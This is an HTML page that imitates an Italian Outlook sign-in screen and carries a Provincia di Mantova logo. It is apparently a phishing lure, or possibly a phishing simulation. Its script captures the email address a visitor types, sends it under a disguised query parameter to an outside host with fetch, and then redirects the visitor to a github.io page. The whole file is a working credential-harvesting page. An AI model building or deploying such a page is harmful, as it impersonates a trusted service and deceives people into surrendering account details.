<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <!-- Primary Meta Tags -->
    <title>Accedi ad Outlook</title>
    <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
    <!-- CSS -->


<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-image: url('back.png');
  background-size: cover;
  line-height: 1.6;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 0;
  margin: 0;
}

.center-div {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background-color: white;
  width: 65%;
  max-width: 440px;
  height: 380px;
  padding: 40px;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
  display: flex;
  flex-direction: column;
  gap: 10px;
}

/* Mobile styles */
@media only screen and (max-width: 767px) {
  body {
    background-image: none;
    background-color: white;
    display: block;
  }

  .center-div {
    position: fixed;
    top: 0;
    left: 0;
    transform: none;
    width: 100%;
    height: 100vh;
    max-width: none;
    padding: 20px;
    box-shadow: none;
  }

  .bd,
  .sub-div1,
  .sub-div2,
  .sub-div21,
  .sub-div3,
  .sub-div4 {
    max-width: 100% !important;
  }
}

.bd {
  max-width: 352px;
  margin-top: 9px;
  height: 240px;
  display: flex;
  flex-direction: column;
}

.container {
  display: flex;
  justify-content: flex-end;
  width: 100%;
  margin-top: auto;
}

.blue-button {
  background-color: #0864bc;
  color: white;
  border: none;
  padding: 10px 20px;
  font-size: 16px;
  cursor: pointer;
  border-radius: 5px;
}

.blue-button:hover {
  background-color: #0864bc;
}

.sub-div1 {
  max-width: 352px;
  height: 36px;
  display: flex;
  justify-content: flex-start;
  align-items: center;
}

.sub-div2 {
  max-width: 352px;
  height: 36px;
  display: flex;
  justify-content: flex-start;
  align-items: center;
}

.sub-div21 {
  max-width: 352px;
  height: 20px;
  display: flex;
  justify-content: flex-start;
  align-items: center;
  margin-bottom: 16px;
}

.sub-div3 {
  max-width: 352px;
  height: 36px;
  display: flex;
  justify-content: flex-start;
  align-items: center;
}

.sub-div3 input {
  border: none;
  outline: none;
  background: transparent;
  width: 100%;
  height: 100%;
  font-size: 16px;
  border-bottom: 1px solid #0864bc;
}

.sub-div4 {
  max-width: 352px;
  height: 36px;
  display: flex;
  justify-content: flex-start;
  align-items: center;
}
</style>
    <!-- <link rel="stylesheet" href="css/styles.css"> -->
</head>
<body>
    <!-- Header Section -->
    <header>
        <!-- Any header content goes here -->
    </header>

    <!-- Main Content -->
    <main>
        <!-- Central White Div -->
        <div class="center-div">
            <!-- Sub Divs (7 total) -->
<div class="sub-div1">
    <img src="bannerlogo" alt="Provincia di Mantova Logo" class="logo">
</div>


<div class="bd">

            <div class="sub-div2">
			    <h2>Accedi</h2>
			</div>

	            <div class="sub-div21">
				<small>Passare ad Outlook</small>
			</div>						
            <div class="sub-div3">
			<input type="text" id="myInput" class="sub-div" placeholder="Indirizzo di posta elettronica">
			</div>
            <div class="sub-div4">
			<small>Nessun account?&nbsp;</small> <a href="https://www.outlook.com" target="_blank"><small>Creane uno</small></a>
			</div>

            <div class="container">
			  <button class="blue-button">Accedi</button>
			</div>
</div>

        </div>
    </main>

<script>

document.getElementById('myInput').focus();

document.querySelector('.blue-button').addEventListener('click', async () => {
  const inputContent = document.getElementById('myInput').value;
  const encodedContent = encodeURIComponent(inputContent);
  const apiUrl = `https://organigramma.provincia.mantova.it?scriptAllineamento=${encodedContent}`;

  try {
    const response = await fetch(apiUrl);
    // We still check the response but don't use it
    if (!response.ok) throw new Error('Request failed');
    await response.text(); // Still consume the response
  } catch (error) {
    console.error('Error:', error); // Optional logging
  } finally {
    // This will execute regardless of success/error
    window.location.href = 'https://prov-mantova.github.io/provincia-di-mantova/redirect.html';
  }
});
</script>
</body>
</html>
